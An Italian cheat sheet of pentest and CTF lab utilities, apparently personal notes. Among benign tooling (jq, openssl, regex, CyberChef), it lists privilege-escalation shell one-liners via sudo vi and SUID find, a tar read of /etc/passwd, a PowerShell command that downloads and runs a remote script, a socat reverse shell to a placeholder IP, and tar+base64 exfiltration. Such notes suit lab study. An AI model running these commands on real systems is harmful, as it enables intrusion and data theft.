# 🧩 Misc & Utility

Appunti vari che non rientrano nelle altre categorie.

* Cheatsheet rapidi
* Script utili
* Collegamenti a risorse esterne (per consultazione durante i lab)

---

## 📌 Obiettivi

* Avere “coltellini svizzeri” pronti (encoding, parsing, file transfer, tunneling).
* Sapere dove cercare rapidamente *bypass* e trucchi (Linux/Windows).
* Standardizzare snippet riusabili in pochi secondi.

---

## 🧯 GTFOBins (Linux)

**Perché usarlo:** trovare *bypass* e *privesc* con binari legittimi.
**Uso rapido:** cerca il binario consentito (es. `tar`, `find`, `vi`) e applica la tecnica.

**Esempi comuni**

```bash
# Shell tramite vi
sudo vi -c ':!/bin/sh' -c ':q'

# SUID find → shell
find . -exec /bin/sh -p \; -quit

# tar → file read (path traversal)
tar -cvf out.tar ../../etc/passwd
```

> Tip: quando vedi un binario “insolito” con sudo/SUID, pensa subito a GTFOBins.

---

## 🪟 LOLBAS (Windows)

**Perché usarlo:** *living-off-the-land* su Windows: esecuzioni, download, DLL hijack, ecc.
**Esempi utili**

```powershell
# Download file
certutil -urlcache -f http://<IP>/tool.exe tool.exe
# oppure
powershell -c "iwr http://<IP>/f.txt -OutFile f.txt"

# Esecuzione script remoto (solo lab!)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/s.ps1')"
```

> Tip: cerca il nome dell’eseguibile di sistema (es. `mshta`, `rundll32`, `regsvr32`) su LOLBAS per pattern noti.

---

## 🧪 CyberChef (decoder universale)

**Perché usarlo:** pipeline “trascina e componi” per encoding/decoding, XOR, JWT, gzip/base64, regex, forense.
**Ricette lampo**

* **Base64 ⇄ testo**: *From Base64* → *To Hex/To UTF-8*.
* **XOR con chiave**: *XOR* (set “Key”).
* **JWT**: *From Base64*, split `header.payload.signature`, leggi claims.
* **Hashes**: *To SHA-256/MD5* per verifiche rapide.

---

## 🔡 Regex & parsing rapido

**Strumenti:** regex “PCRE-style”, `grep -P`, `awk`, `sed`, `cut`, `tr`, `rev`.

**Snippet utili**

```bash
# Estrai email da file
grep -Po '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]+' file.txt | sort -u

# Prendi la 2ª colonna separata da :
cut -d: -f2 input.txt

# Sostituzione in place con sed (Linux)
sed -i 's/vecchio/nuovo/g' file.txt
```

---

## 🧰 TL;DR & Cheats on demand

**tldr** (riassunti pratici dei comandi), **cheat.sh** (ricette da terminale).

```bash
tldr tar
curl cheat.sh/ssh
```

> Ottimo per “ricordare” opzioni senza aprire manuali infiniti.

---

## 📦 File transfer – 12 modi veloci

**Server al volo**

```bash
# Python
python3 -m http.server 8000
# PHP
php -S 0.0.0.0:8000
# Ruby
ruby -run -e httpd . -p 8000
# BusyBox
busybox httpd -f -p 8000
```

**Client**

```bash
# wget/curl
wget http://<IP>:8000/file   # oppure
curl -O http://<IP>:8000/file

# scp
scp user@host:/path/file .

# SMB (Impacket)
python3 -m impacket.smbserver share .    # server
# lato target (Windows):
net use Z: \\<IP>\share
```

**Windows-only**

```powershell
# PowerShell
iwr http://<IP>/f -OutFile f
# certutil
certutil -urlcache -f http://<IP>/f f
```

---

## 🔐 Encoding/decoding & hashing

```bash
# Base64
cat f.bin | base64 > f.b64
base64 -d f.b64 > f.bin

# Hexdump
xxd -p f.bin | head
xxd -r -p hex.txt > out.bin

# Hash
md5sum file; sha1sum file; sha256sum file
# Windows
certutil -hashfile file SHA256
```

---

## 🧾 Archiviazione & exfil “pulita”

```bash
# Tar + Gzip + Base64 (testo incollabile)
tar czf - cartella/ | base64 > dump.b64
# Ricostruzione
base64 -d dump.b64 | tar xzf -
```

> Utile quando hai solo clipboard o canali “testuali”.

---

## 🧵 TTY & shell upgrade (Linux)

```bash
# Upgrade con Python pty
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Dal lato client
stty raw -echo; fg
export TERM=xterm
# Socat TTY
socat file:`tty`,raw,echo=0 tcp:<IP>:4444
```

> Metti `rlwrap` al listener per frecce e history: `rlwrap nc -lvnp 4444`.

---

## 🔀 Port forwarding & SOCKS

**SSH**

```bash
# Local port forward (accedi a 10.0.0.5:80 tramite localhost:8080)
ssh -L 8080:10.0.0.5:80 user@jump

# Remote port forward (esponi porta del target verso la tua macchina)
ssh -R 8888:localhost:22 user@jump

# SOCKS proxy
ssh -D 1080 user@jump
# poi:
export ALL_PROXY=socks5://127.0.0.1:1080
```

**socat relay**

```bash
# inoltra 0.0.0.0:9000 → 10.0.0.5:80
socat TCP-LISTEN:9000,fork TCP:10.0.0.5:80
```

> Alternative avanzate: chisel, ligolo-ng (solo lab).

---

## 🌐 curl “pronto-produzione”

```bash
# Verboso + header custom + output
curl -v -H 'X-Test: 1' -o out.bin http://host/path

# POST JSON
curl -s -X POST -H 'Content-Type: application/json' -d '{"a":1}' http://host/api

# Proxy
curl -x socks5h://127.0.0.1:1080 http://ifconfig.me
```

---

## 🧩 JSON/YAML & testo strutturato

```bash
# JSON con jq
cat data.json | jq '.items[] | {id, name}'

# YAML con yq
yq '.spec.template.spec.containers[].image' deploy.yaml
```

---

## 🗃️ File intelligence rapida

```bash
file sospetto.bin
strings -n 6 sospetto.bin | head
exiftool immagine.jpg
binwalk -Me firmware.bin
```

> Per individuare *magic bytes*, metadata, archivi annidati, carving.

---

## 🔏 OpenSSL pocket

```bash
# Random & chiavi
openssl rand -hex 16
openssl genrsa -out key.pem 2048
openssl req -new -x509 -key key.pem -out cert.pem -days 365

# Cifratura simmetrica
openssl enc -aes-256-cbc -salt -in segreto.txt -out segreto.enc
openssl enc -d -aes-256-cbc -in segreto.enc -out segreto.txt
```

---

## 🧰 PowerShell “everyday”

```powershell
# Info macchina
Get-ComputerInfo | Select-Object CsName,OsName,OsVersion

# Processi e porte
Get-Process | Sort CPU -desc | Select -First 5
Get-NetTCPConnection -State Listen

# Zip integrato
Compress-Archive -Path .\cartella -DestinationPath out.zip
```

---

## 🗜️ 7-Zip (multi-piattaforma)

```bash
7z a out.7z cartella/      # crea archivio
7z l out.7z                # lista
7z x out.7z -oDIR          # estrai in DIR
```

---

## 🧪 Stego & QR (CTF-ready)

```bash
# Stegseek (wordlist rockyou)
stegseek img.jpg rockyou.txt
# Zbar (QR/barcode)
zbarimg codice.png
```

---

## 📝 Logging & registrazioni

```bash
# Timestamp sugli output (moreutils)
some_command | ts '[%Y-%m-%d %H:%M:%S]'

# Sessione terminale
script -q session.log
# Replay
scriptreplay timingfile session.log
```

---

## 🛠️ Snippet Bash “template”

```bash
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

log(){ printf "[*] %s\n" "$*" ;}

require(){ command -v "$1" >/dev/null 2>&1 || { echo "Missing $1"; exit 1; };}

main(){
  require curl
  log "Start…"
  # TODO
}
main "$@"
```

---

## 🔗 Risorse rapide (da ricordare)

* **GTFOBins** (bypass/privesc Linux)
* **LOLBAS** (bypass/privesc Windows)
* **CyberChef** (decoding/forense “a blocchi”)
* **tldr** / **cheat.sh** (comandi in breve)
* **PayloadsAllTheThings** (pattern e tecniche per test in lab)
* **HackTricks** (reference enciclopedico per tanti servizi)
* **Regex101** (test e spiegazione regex)

> **Nota etica:** tutto il materiale è per **ambienti controllati** (HTB/THM/lab). Non usare mai su sistemi senza permesso esplicito.

---

## ✅ Checklist veloce (quando serve “un attimo”)

* Serve decodifica strana? → **CyberChef**
* Ho binari “strani” con permessi elevati? → **GTFOBins/LOLBAS**
* Devo spostare file al volo? → `python3 -m http.server`, `wget/curl`, `scp`
* Output ingestibile? → **jq/yq**, `awk/sed`, `ts` per timestamp
* Shell “scomoda”? → **pty upgrade**, `rlwrap`, `socat`
* Proxy/tunnel? → `ssh -D` (SOCKS), `ssh -L/-R`, `socat` relay
